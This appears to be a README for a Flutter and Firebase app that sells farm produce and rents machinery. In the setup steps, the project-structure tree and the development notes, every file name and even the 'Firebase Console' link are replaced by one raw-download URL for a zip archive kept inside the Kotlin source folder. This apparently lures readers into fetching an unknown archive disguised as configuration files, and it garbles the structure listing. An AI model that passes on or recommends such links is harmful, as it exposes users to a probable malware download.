# 🌱 Green Gold Farms Mobile App

A modern, professional mobile application for Green Gold Farms - a large-scale sustainable farming business in Ghana. Built with Flutter and Firebase.

## 🎨 Design Features

- **Modern UI**: Clean, nature-inspired theme using green and white as primary colors
- **Farm-Friendly**: Soft gradients, rounded buttons, and plenty of white space
- **Minimalist**: Easy to navigate with farm-related icons and soft shadows for depth
- **Responsive**: Optimized for mobile devices with intuitive navigation

## 📱 App Structure

### Navigation
- **Home**: Farm logo, welcome banner, quick access buttons, latest updates
- **Produce**: Product catalog with categories (Grains, Vegetables, Fruits)
- **Machinery**: Equipment rental and sales with detailed specifications
- **Profile**: User profile, settings, order history, and saved items

### Key Features
- **Product Management**: Browse and purchase farm produce
- **Machinery Rental**: Book tractors, bulldozers, planters, and more
- **Machinery Sales**: Purchase farm equipment with detailed specs
- **Order Tracking**: View order history and status
- **Real-time Updates**: Latest farm news and updates
- **Cart System**: Add products to cart and manage purchases

## 🚀 Getting Started

### Prerequisites
- Flutter SDK (3.6.1 or higher)
- Dart SDK
- Android Studio / VS Code
- Firebase project

### Installation

1. **Clone the repository**
   ```bash
   git clone <repository-url>
   cd green_gold_farm
   ```

2. **Install dependencies**
   ```bash
   flutter pub get
   ```

3. **Firebase Setup**
   - Create a new Firebase project at [Firebase Console](https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip)
   - Enable Authentication, Firestore, and Storage
   - Download the configuration files:
     - `https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip` for Android (place in `android/app/`)
     - `https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip` for iOS (place in `ios/Runner/`)

4. **Update Firebase Configuration**
   - Replace placeholder values in `https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip` with your actual Firebase project credentials
   - Or use FlutterFire CLI to generate the configuration:
     ```bash
     dart pub global activate flutterfire_cli
     flutterfire configure
     ```

5. **Run the app**
   ```bash
   flutter run
   ```

## 🏗️ Project Structure

```
lib/
├── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip                 # App entry point
├── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip     # Firebase configuration
├── theme/
│   └── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip       # App theme and styling
├── models/
│   ├── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip         # Product data model
│   └── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip       # Machinery data model
├── services/
│   └── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip # Firebase operations
└── screens/
    ├── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip      # Home screen
    ├── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip   # Product catalog
    ├── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip # Equipment rental/sales
    └── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip  # User profile
```

## 🎨 Theme & Styling

### Colors
- **Primary Green**: `#27AE60`
- **Light Green**: `#2ECC40`
- **Dark Green**: `#1E8449`
- **Accent Gold**: `#F9D342`
- **White**: `#FFFFFF`
- **Light Gray**: `#F5F5F5`

### Typography
- **Headings**: Montserrat (Bold, Semi-bold)
- **Body Text**: Roboto (Regular)
- **Buttons**: Montserrat (Semi-bold)

### Design Elements
- Rounded corners (8px, 12px, 16px, 24px)
- Soft shadows for depth
- Gradient backgrounds
- Farm-related icons
- Generous white space

## 🔥 Firebase Integration

### Collections
- **products**: Farm produce catalog
- **machinery**: Equipment for rental and sale
- **users**: User profiles and preferences
- **orders**: Purchase and rental orders
- **news**: Farm updates and announcements
- **cart**: User shopping cart items

### Features
- Real-time data synchronization
- User authentication
- Cloud storage for images
- Offline support
- Push notifications (ready for implementation)

## 📱 Screenshots

### Home Screen
- Welcome banner with farm logo
- Quick access grid (6 buttons)
- Latest updates carousel

### Produce Screen
- Category tabs (Grains, Vegetables, Fruits)
- Product cards with images and prices
- Add to cart functionality

### Machinery Screen
- Rental booking form
- Equipment catalog
- Detailed machinery specifications
- Availability status

### Profile Screen
- User profile information
- Account settings menu
- Order history
- Statistics dashboard

## 🛠️ Development

### Adding New Features
1. Create models in `lib/models/`
2. Add Firebase operations in `lib/services/`
3. Create UI components in `lib/screens/`
4. Update navigation in `https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip`

### Styling Guidelines
- Use `AppTheme` constants for colors, spacing, and typography
- Follow the established design patterns
- Maintain consistency with the farm-friendly theme
- Test on different screen sizes

## 📦 Dependencies

### Core
- `flutter`: UI framework
- `firebase_core`: Firebase initialization
- `firebase_auth`: User authentication
- `cloud_firestore`: Database operations
- `firebase_storage`: File storage

### UI Enhancement
- `google_fonts`: Custom typography
- `cached_network_image`: Image caching
- `flutter_svg`: SVG support
- `font_awesome_flutter`: Icon library
- `carousel_slider`: Image carousels
- `shimmer`: Loading animations

### State Management
- `provider`: State management
- `shared_preferences`: Local storage

### Utilities
- `image_picker`: Image selection
- `intl`: Internationalization

## 🚀 Deployment

### Android
```bash
flutter build apk --release
```

### iOS
```bash
flutter build ios --release
```

### Web
```bash
flutter build web --release
```







---

**Green Gold Farms** - Sustainable farming for a better tomorrow 🌱
